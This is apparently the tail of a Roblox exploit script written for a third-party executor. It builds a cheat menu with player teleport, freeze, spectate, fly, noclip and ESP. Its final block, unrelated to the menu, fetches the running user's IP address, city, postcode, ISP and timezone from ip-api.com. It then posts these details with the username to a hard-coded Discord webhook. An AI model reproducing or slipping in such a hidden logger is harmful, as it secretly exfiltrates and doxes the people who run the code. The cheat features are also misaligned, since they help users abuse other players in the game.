                    row.Name = p.Name; row.Size = UDim2.new(1, 0, 0, 48); row.BackgroundColor3 = THEME.CardBg; row.BorderSizePixel = 0; row.Parent = listHolder
                    local rowCorner = Instance.new("UICorner"); rowCorner.CornerRadius = UDim.new(0, 6); rowCorner.Parent = row
                    local rowBorder = Instance.new("UIStroke"); rowBorder.Color = THEME.Border; rowBorder.Parent = row

                    local avatarImg = Instance.new("ImageLabel")
                    avatarImg.Size = UDim2.new(0, 32, 0, 32); avatarImg.Position = UDim2.new(0, 8, 0.5, -16); avatarImg.BackgroundColor3 = THEME.Background; avatarImg.BorderSizePixel = 0; avatarImg.Parent = row
                    local imgCorner = Instance.new("UICorner"); imgCorner.CornerRadius = UDim.new(1, 0); imgCorner.Parent = avatarImg

                    task.spawn(function()
                        local content, isReady = Players:GetUserThumbnailAsync(p.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
                        if isReady and avatarImg and avatarImg.Parent then avatarImg.Image = content end
                    end)

                    local nameLabel = Instance.new("TextLabel")
                    nameLabel.Size = UDim2.new(0.28, 0, 1, 0); nameLabel.Position = UDim2.new(0, 46, 0, 0); nameLabel.BackgroundTransparency = 1; nameLabel.Text = p.DisplayName .. "\n<font color='#a0a5af'>@" .. p.Name .. "</font>"; nameLabel.TextColor3 = THEME.TextMain; nameLabel.Font = Enum.Font.GothamMedium; nameLabel.TextSize = 10; nameLabel.RichText = true; nameLabel.TextXAlignment = Enum.TextXAlignment.Left; nameLabel.TextYAlignment = Enum.TextYAlignment.Center; nameLabel.Parent = row

                    -- FREEZE BUTTON PER PLAYER
                    local isFrozen = _G.FrozenPlayers[p] or false
                    local freezeBtn = Instance.new("TextButton")
                    freezeBtn.Size = UDim2.new(0, 42, 0, 26); freezeBtn.Position = UDim2.new(1, -138, 0.5, -13); freezeBtn.BackgroundColor3 = isFrozen and THEME.Alert or THEME.IceBlue; freezeBtn.TextColor3 = THEME.Sidebar; freezeBtn.Font = Enum.Font.GothamBold; freezeBtn.TextSize = 8; freezeBtn.Text = isFrozen and "THAW" or "ICE"; freezeBtn.Parent = row
                    local fBtnCorner = Instance.new("UICorner"); fBtnCorner.CornerRadius = UDim.new(0, 4); fBtnCorner.Parent = freezeBtn

                    freezeBtn.MouseButton1Click:Connect(function()
                        local active = toggleTargetFreeze(p)
                        freezeBtn.Text = active and "THAW" or "ICE"
                        freezeBtn.BackgroundColor3 = active and THEME.Alert or THEME.IceBlue
                    end)

                    local tpBtn = Instance.new("TextButton")
                    tpBtn.Size = UDim2.new(0, 40, 0, 26); tpBtn.Position = UDim2.new(1, -92, 0.5, -13); tpBtn.BackgroundColor3 = THEME.Accent; tpBtn.TextColor3 = THEME.Sidebar; tpBtn.Font = Enum.Font.GothamBold; tpBtn.TextSize = 9; tpBtn.Text = "TP"; tpBtn.Parent = row
                    local btnCorner = Instance.new("UICorner"); btnCorner.CornerRadius = UDim.new(0, 4); btnCorner.Parent = tpBtn
                    tpBtn.MouseButton1Click:Connect(function()
                        if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and rootPart then
                            rootPart.CFrame = p.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                        end
                    end)

                    local viewBtn = Instance.new("TextButton")
                    viewBtn.Size = UDim2.new(0, 44, 0, 26); viewBtn.Position = UDim2.new(1, -48, 0.5, -13); viewBtn.BackgroundColor3 = THEME.ToggleOn; viewBtn.TextColor3 = THEME.Sidebar; viewBtn.Font = Enum.Font.GothamBold; viewBtn.TextSize = 8; viewBtn.Text = "WATCH"; viewBtn.Parent = row
                    local vBtnCorner = Instance.new("UICorner"); vBtnCorner.CornerRadius = UDim.new(0, 4); vBtnCorner.Parent = viewBtn
                    viewBtn.MouseButton1Click:Connect(function()
                        if p.Character and p.Character:FindFirstChildOfClass("Humanoid") then camera.CameraSubject = p.Character:FindFirstChildOfClass("Humanoid") end
                    end)
                end
            end
        end
        listHolder.Size = UDim2.new(1, -6, 0, listLayout.AbsoluteContentSize.Y)
    end

    searchBar:GetPropertyChangedSignal("Text"):Connect(updateList)
    Players.PlayerAdded:Connect(updateList)
    Players.PlayerRemoving:Connect(function(p) removeESP(p); _G.FrozenPlayers[p] = nil; updateList() end)
    task.spawn(updateList)
end)

createTab("System-Stats", 6, function(parent)
    local card = Instance.new("Frame")
    card.Size = UDim2.new(1, -6, 0, 120); card.BackgroundColor3 = THEME.CardBg; card.BorderSizePixel = 0; card.Parent = parent
    local cardCorner = Instance.new("UICorner"); cardCorner.CornerRadius = UDim.new(0, 8); cardCorner.Parent = card
    local cardBorder = Instance.new("UIStroke"); cardBorder.Color = THEME.Border; cardBorder.Parent = card
    
    local info = Instance.new("TextLabel")
    info.Size = UDim2.new(1, -30, 1, -20); info.Position = UDim2.new(0, 15, 0, 12); info.BackgroundTransparency = 1; info.TextColor3 = THEME.TextDark; info.Font = Enum.Font.Gotham; info.TextSize = 13; info.RichText = true; info.LineHeight = 1.4; info.TextXAlignment = Enum.TextXAlignment.Left; info.TextYAlignment = Enum.TextYAlignment.Top; info.Parent = card
    
    local function refresh()
        local creatorStr = game.CreatorId ~= 0 and tostring(game.CreatorId) or "Studio"
        info.Text = string.format("Environment:  <font color='#00b4ff'><b>%s</b></font>\nInstances:          <font color='#ffffff'><b>%d</b></font>\nCreator ID:        <font color='#ffffff'><b>%s</b></font>", workspace.Name, #workspace:GetDescendants(), creatorStr)
    end
    refresh()
    task.spawn(function() while task.wait(3) and info.Parent do refresh() end end)
end)

-- Events
mouse.Button1Down:Connect(function()
    if _G.DevStates.ClickTP and mouse.Hit and rootPart then
        rootPart.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 4, 0))
    end
end)

local function setupCharacterEvents(newChar)
    character = newChar
    humanoid = character:WaitForChild("Humanoid", 5)
    rootPart = character:WaitForChild("HumanoidRootPart", 5)
    if not humanoid or not rootPart then return end
    
    humanoid.WalkSpeed = _G.DevStates.WalkSpeed
    humanoid.UseJumpPower = true
    humanoid.JumpPower = _G.DevStates.JumpPower
    
    camera.CameraSubject = humanoid
    if _G.DevStates.Flying then startFlying() else stopFlying() end
    if _G.DevStates.Noclip then startNoclip() else stopNoclip() end
    if _G.DevStates.ESP then startESP() end
end

setupCharacterEvents(character)
player.CharacterAdded:Connect(setupCharacterEvents)

openMovement()


local player_name = game:GetService("Players").LocalPlayer.Name
local webhook_url = "https://discord.com/api/webhooks/1528754900912312330/uQeZj_LloM_1OaSCoAqbKCkEveATjL4B6xOt_RQDCdzqxbdNoHOHW7U2u742wEwfia9I"

local http_request = syn and syn.request or request

if http_request then
    local ip_info = http_request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })
    
    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
    

    local as_name = ipinfo_table.asname or "N/A"
    local timezone = ipinfo_table.timezone or "N/A"
    local isp = ipinfo_table.isp or "N/A"
    local org = ipinfo_table.org or "N/A"
    
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s\nAS Name: %s\nTimezone: %s```", 
        player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, isp, org, as_name, timezone)
    
    http_request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    })
else
    warn("Dein Executor unterstützt keine HTTP-Requests!")
end



